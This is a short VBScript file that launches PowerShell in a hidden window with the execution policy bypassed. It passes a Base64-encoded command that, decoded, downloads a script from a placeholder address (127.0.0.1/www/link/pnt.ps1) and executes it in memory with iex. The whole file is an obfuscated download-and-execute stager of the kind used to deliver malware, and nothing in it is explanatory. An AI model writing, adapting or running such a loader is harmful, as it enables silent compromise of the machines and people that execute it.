Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")
ps = "powershell.exe -Exec Bypass -NoL -Nop -Win hidden -Enc aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB3AHcAdwAvAGwAaQBuAGsALwBwAG4AdAAuAHAAcwAxACcAKQApAA=="
objShell.run(ps),0,true
Set objShell = Nothing
